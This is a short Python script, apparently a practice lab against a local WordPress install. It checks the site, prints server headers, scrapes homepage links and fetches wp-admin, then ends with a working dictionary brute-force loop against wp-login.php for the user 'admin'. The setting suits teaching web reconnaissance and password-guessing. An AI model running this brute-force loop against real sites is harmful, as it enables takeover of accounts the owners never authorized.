# Check if web portal is up using get request
import requests
requests.get("http://127.0.0.1")

# which server software being used
req_ = requests.get("http://127.0.0.1")
print(req_.headers)

# get text content of homepage
print(req_.content)

# Print response in a pretty form using bs4
from bs4 import BeautifulSoup
soup = BeautifulSoup(req_.text, 'html.parser')
print(soup.prettify())

print(soup.title)

# Scrape all URLs from homepage of localhost and print unique Urls
home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.content, "html.parser")
imgs = soup.find_all("a", href=True)
imgs_href = []

for img in imgs:
    imgs_href.append(img['href'])

imgs_set = set(imgs_href)

for img in imgs_set:
    print(img)


# accessing the admin section of the CMS (wp-admin)
word_p = requests.get("http://localhost/wp-admin/")
soup_word_p = BeautifulSoup(word_p.text, "html.parser")
print(soup_word_p.prettify())

# Bruteforce wordpress login for user "admin" using the given dictionary
passfile = "password_dictionary.txt"
with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying_ = requests.post("http://localhost/wp-login.php", data={"log":"admin", "pwd":word})
        if "ERROR" not in trying_.text:
            print("Success, the password is : "+word)
        else:
            print("Incorrect password: "+word)

